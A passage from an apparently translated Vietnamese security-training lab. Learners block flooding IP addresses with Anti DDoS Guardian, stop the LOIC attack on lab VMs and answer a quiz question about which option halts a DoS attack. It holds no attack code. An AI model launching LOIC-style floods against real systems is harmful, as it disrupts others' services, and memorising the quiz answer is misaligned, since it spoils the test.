19. Bạn có thể sử dụng nhiều tùy chọn khác nhau từ ngăn bên trái, chẳng hạn như Xóa, Dừng danh sách, Chặn IP và Cho phép IP. Sử dụng tùy chọn Chặn IP (B) sẽ chặn địa chỉ IP gửi số lượng lớn gói tin.

20. Trong cửa sổ Trình xem chi tiết lưu lượng truy cập , hãy nhấp vào tùy chọn Chặn IP từ ngăn bên trái.

> ![Screenshot](media/image38.jpeg){width="10.6625in" height="8.0in"}

21. Quan sát phiên IP bị chặn chuyển sang màu đỏ trong cột Hành động đã thực hiện.

> ![Screenshot](media/image39.jpeg){width="10.6625in" height="8.0in"}

22. Tương tự, bạn có thể Chặn IP địa chỉ của phiên 10.10.1.19.

23. Sau khi hoàn thành nhiệm vụ, hãy nhấp vào Dừng tràn, sau đó đóng cửa sổ LOIC trên tất cả các máy của kẻ tấn công. (Windows Server 2019 và Windows Server 2022).

> Để chuyển sang Windows Server 2019, hãy nhấp vào Windows Server 2019.[Windows Server 2019](https://labclient.labondemand.com/Instructions/5e62cbc3-7e1c-4abe-9fde-c1935a4891a1?showWhenStarting=1)
>
> Để chuyển sang Windows Server 2022, hãy nhấp vào Windows Server 2022.[Windows Server 2022](https://labclient.labondemand.com/Instructions/5e62cbc3-7e1c-4abe-9fde-c1935a4891a1?showWhenStarting=1)
>
> ![Screenshot](media/image40.jpeg){width="10.6625in" height="8.0in"}

24. Phần này kết thúc phần minh họa cách phát hiện và bảo vệ chống lại cuộc tấn công DDoS bằng cách sử dụng Anti DDoS Guardian.

25. Đóng tất cả các cửa sổ đang mở và ghi lại tất cả thông tin thu được.

26. Bạn cũng có thể sử dụng các công cụ bảo vệ DoS và DDoS khác, chẳng hạn như dịch vụ bảo vệ DDoS của DOSarrest (https://www.dosarrest.com), DDoS-GUARD (https://ddos-guard.net), Radware DefensePro X (https://www.radware.com), F5 DDoS Attack Protection (https://www.f5.com) để bảo vệ hệ thống và mạng của tổ chức khỏi các cuộc tấn công DoS và DDoS.

27. Nhấp vào Windows 11 để chuyển sang máy ảo Windows 11. Trong máy Windows 11, hãy điều hướng đến Bảng điều khiển -\> Chương trình -\> Chương trình và tính năng và gỡ cài đặt Chống DDoS Guardian.[Windows 11](https://labclient.labondemand.com/Instructions/5e62cbc3-7e1c-4abe-9fde-c1935a4891a1?showWhenStarting=1)

**Câu 10.2.1.1**

Đối với tác vụ này, trước tiên hãy sử dụng công cụ LOIC trên máy Windows Server 2019 và Windows Server 2022 để thực hiện cuộc tấn công DDoS vào hệ thống đích Windows 11. Sau đó, sử dụng công cụ Anti DDoS Guardian trên máy Windows 11 để phát hiện và bảo vệ khỏi cuộc tấn công DDoS. Bạn sẽ sử dụng tùy chọn Anti DDoS Guardian nào để ngăn chặn một cuộc tấn công DoS đang diễn ra?

![](media/image14.wmf)
